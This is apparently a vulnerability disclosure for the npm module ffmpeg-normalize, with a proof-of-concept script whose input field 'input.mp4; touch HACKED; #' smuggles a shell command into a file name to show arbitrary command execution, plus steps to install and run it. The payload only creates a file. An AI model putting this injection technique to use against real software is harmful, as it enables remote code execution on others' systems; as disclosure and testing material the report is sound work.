# :bug: Description

The `ffmpeg-normalize` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executedading to `arbitrary command injection`

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
const normalize = require('ffmpeg-normalize');
 
normalize({
    input: 'input.mp4; touch HACKED; #',
    output: 'output.mp4',
    loudness: {
        normalization: 'ebuR128',
        target: {input_i: -23}
    },
    verbose: false
}).then(normalized  => {}).catch(error => {console.log()});

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i ffmpeg-normalize # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
